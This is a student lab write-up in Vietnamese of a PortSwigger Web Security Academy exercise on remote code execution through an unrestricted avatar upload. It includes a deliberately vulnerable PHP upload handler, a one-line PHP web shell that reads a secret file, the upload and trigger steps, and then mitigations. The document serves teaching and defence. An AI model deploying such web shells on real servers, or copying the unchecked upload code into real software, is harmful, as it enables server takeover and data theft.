# BÁO CÁO BÀI TẬP: FILE UPLOAD VULNERABILITIES (TUẦN 10)
## BÀI THỰC HÀNH: REMOTE CODE EXECUTION VIA WEB SHELL UPLOAD

* **Tên bài Lab:** Remote code execution via web shell upload
* **Nền tảng thực hành:** PortSwigger Web Security Academy
* **Link Lab:** [https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
* **Phân loại lỗ hổng:** File Upload Vulnerability / Remote Code Execution (RCE)

---

### 1. Lỗ hổng là gì?

Đây là lỗ hổng **Tải lên tệp tin tùy ý không hạn chế (Unrestricted File Upload)** dẫn đến **Thực thi mã từ xa (Remote Code Execution - RCE)** tại chức năng cập nhật ảnh đại diện (Avatar) của trang cá nhân (`/my-account`).

* **Bản chất:** Ứng dụng web cho phép người dùng tải tệp lên máy chủ nhưng **hoàn toàn không có cơ chế thẩm định** (không kiểm tra phần mở rộng, không kiểm tra nội dung tệp), đồng thời lưu tệp trực tiếp vào một thư mục thuộc Web Root (`/files/avatars/`) có đầy đủ quyền thực thi mã kịch bản PHP.
* **Hậu quả:** Kẻ tấn công có thể tải lên một tệp kịch bản PHP (Web Shell). Khi kẻ tấn công truy cập vào đường dẫn tệp tin đó qua trình duyệt, máy chủ web Apache sẽ biên dịch và thực thi đoạn mã PHP, cho phép kẻ tấn công đọc toàn bộ tệp tin hệ thống và chiếm quyền điều khiển máy chủ.

---

### 2. Vì sao nó tồn tại?

Lỗ hổng xuất phát từ hai sai sót kiến trúc nghiêm trọng:

1. **Thiếu hoàn toàn khâu kiểm định ở Backend:** Đoạn mã xử lý tải tệp của ứng dụng lấy trực tiếp tên tệp do người dùng gửi lên (`$_FILES['avatar']['name']`) và dùng hàm lưu tệp xuống đĩa mà không áp dụng bất kỳ danh sách trắng (Whitelist) nào để chặn các tệp kịch bản nguy hiểm.
2. **Cấu hình sai phân quyền thư mục trên Web Server:** Thư mục lưu trữ ảnh `/files/avatars/` nằm ngay trong thư mục công khai của website (Web Root) và máy chủ web Apache vẫn bật cờ cho phép thực thi mã kịch bản PHP (chưa cấu hình tắt `engine off`).

#### Đoạn mã Backend mô phỏng bị lỗi (Vulnerable Code - PHP):
```php
<?php
// NGUY HIỂM: Lưu trực tiếp tệp từ người dùng mà không kiểm tra
$target_dir = "avatars/";
$target_file = $target_dir . basename($_FILES["avatar"]["name"]);

// Lưu thẳng tệp vào thư mục web mà không kiểm tra đuôi .php hay nội dung
if (move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file)) {
    echo "The file avatars/" . htmlspecialchars(basename($_FILES["avatar"]["name"])) . " has been uploaded.";
}
?>
```

---

### 3. Cách khai thác (Kèm giải thích chi tiết từng thành phần Payload)

* **Tài khoản được cấp:** `wiener:peter`
* **Mục tiêu:** Khai thác lỗ hổng để đọc nội dung tệp bí mật tại `/home/carlos/secret` và nộp lên hệ thống.

---

#### 3.1. Các bước thực hiện khai thác thực tế:

##### Bước 1: Tạo tệp Web Shell trên máy tấn công
Tạo một tệp tin văn bản thuần túy đặt tên là `shell.php` với nội dung:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

#### 🔍 Bảng giải thích chi tiết từng thành phần Payload `shell.php`:

| Thành phần | Ý nghĩa & Cơ chế hoạt động chi tiết |
| :--- | :--- |
| `<?php` | **Thẻ mở PHP:** Báo hiệu cho trình biên dịch PHP trên máy chủ biết đây là điểm bắt đầu của khối mã kịch bản thực thi. |
| `file_get_contents(...)` | **Hàm đọc tệp nội tại của PHP:** Mở và đọc toàn bộ dữ liệu của một tệp tin trên hệ điều hành máy chủ vào bộ nhớ dưới dạng một chuỗi văn bản. |
| `'/home/carlos/secret'` | **Đường dẫn tệp mục tiêu:** Đường dẫn tuyệt đối dẫn đến tệp tin nhạy cảm của người dùng `carlos` trên hệ thống Linux mà đề bài yêu cầu trích xuất. |
| `echo` | **Lệnh xuất dữ liệu:** In toàn bộ chuỗi nội dung vừa đọc được ra phản hồi HTTP để gửi về trình duyệt của kẻ tấn công. |
| `?>` | **Thẻ đóng PHP:** Đánh dấu kết thúc khối mã kịch bản thực thi. |

---

##### Bước 2: Tải Web Shell lên ứng dụng
1. Đăng nhập vào bài lab bằng tài khoản `wiener:peter`.
2. Truy cập vào trang **My account** (`/my-account`).
3. Tại phần **Upload avatar**, chọn tệp `shell.php` vừa tạo và bấm nút **Upload**.
4. Máy chủ phản hồi thông báo tải lên thành công:
   > *"The file avatars/shell.php has been uploaded."*

##### Bước 3: Kích hoạt Web Shell để trích xuất dữ liệu
1. Quay lại trang **My account**, quan sát mã nguồn HTML hoặc cấu trúc ảnh đại diện:
   ```html
   <img src="/files/avatars/shell.php" class="avatar">
   ```
2. Gửi một HTTP GET request trực tiếp đến đường dẫn tệp tin:
   ```http
   GET /files/avatars/shell.php HTTP/1.1
   Host: <YOUR-LAB-ID>.web-security-academy.net
   Cookie: session=...
   ```
3. **Kết quả:** Máy chủ Apache nhận diện phần mở rộng `.php`, chuyển giao tệp cho trình thông dịch PHP thực thi lệnh `file_get_contents` và trả về chuỗi bí mật (Secret string):
   ```text
   b1c2d3e4f5a6b7c8d9e0...
   ```
4. Copy chuỗi bí mật này, bấm nút **Submit solution** ở góc trên trang web và dán vào $\rightarrow$ Bài lab chuyển sang trạng thái **Solved** thành công!

---

### 4. Cách phòng chống triệt để

1. **Áp dụng danh sách trắng nghiêm ngặt (Strict Whitelist):** Chỉ cho phép các phần mở rộng ảnh hợp lệ (`.jpg`, `.jpeg`, `.png`), từ chối tuyệt đối mọi đuôi mở rộng có thể thực thi (`.php`, `.phtml`, `.jsp`, `.aspx`).
2. **Đổi tên tệp ngẫu nhiên (UUID v4):** Tự động sinh tên ngẫu nhiên cho tệp khi lưu (ví dụ: `a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d.png`), không dùng tên gốc do người dùng đặt để ngăn kẻ tấn công đoán đường dẫn gọi file.
3. **Lưu trữ ngoài Web Root & Tắt quyền thực thi:**
   * Lưu tệp tại thư mục nằm ngoài cấu trúc phục vụ web của server (ví dụ `/var/storage/uploads/`).
   * Cấu hình máy chủ web tắt hoàn toàn engine thực thi mã kịch bản trong thư mục chứa file tải lên:
     ```apache
     <Directory "/var/www/html/avatars">
         php_admin_flag engine off
         Options -ExecCGI
     </Directory>
     ```
